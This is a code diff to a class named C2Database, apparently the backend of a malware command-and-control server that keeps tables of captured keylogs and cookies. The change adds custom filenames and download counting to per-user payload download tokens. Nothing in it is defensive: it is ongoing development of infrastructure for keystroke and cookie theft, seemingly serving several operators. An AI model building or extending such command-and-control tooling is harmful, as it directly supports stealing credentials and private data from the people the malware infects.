@@ -147,6 +147,12 @@ class C2Database {
             console.log('Migration: added clean_text column to keylogs');
         } catch (e) { /* column already exists */ }
 
+        // Migration: add custom_filename column to download_tokens if not present
+        try {
+            this.db.exec(`ALTER TABLE download_tokens ADD COLUMN custom_filename TEXT`);
+            console.log('Migration: added custom_filename column to download_tokens');
+        } catch (e) { /* column already exists */ }
+
         // Create cookies table
         this.db.exec(`
             CREATE TABLE IF NOT EXISTS cookies (
@@ -743,19 +749,25 @@ class C2Database {
     // ---------- Download token methods ----------
 
     getOrCreateDownloadToken(userId) {
-        const existing = this.db.prepare('SELECT token FROM download_tokens WHERE user_id = ?').get(userId);
-        if (existing) return existing.token;
+        const existing = this.db.prepare('SELECT token, custom_filename FROM download_tokens WHERE user_id = ?').get(userId);
+        if (existing) return { token: existing.token, customFilename: existing.custom_filename || null };
         const { randomBytes } = require('crypto');
         const token = randomBytes(24).toString('hex');
         this.db.prepare('INSERT INTO download_tokens (token, user_id) VALUES (?, ?)').run(token, userId);
-        return token;
+        return { token, customFilename: null };
+    }
+
+    setDownloadFilename(userId, filename) {
+        // Ensure token exists first
+        this.getOrCreateDownloadToken(userId);
+        return this.db.prepare('UPDATE download_tokens SET custom_filename = ? WHERE user_id = ?').run(filename || null, userId);
     }
 
     getUserByDownloadToken(token) {
-        const row = this.db.prepare('SELECT user_id FROM download_tokens WHERE token = ?').get(token);
+        const row = this.db.prepare('SELECT user_id, custom_filename FROM download_tokens WHERE token = ?').get(token);
         if (!row) return null;
         this.db.prepare('UPDATE download_tokens SET download_count = download_count + 1 WHERE token = ?').run(token);
-        return row.user_id;
+        return { userId: row.user_id, customFilename: row.custom_filename || null };
     }
     
     // Client operations with user filtering
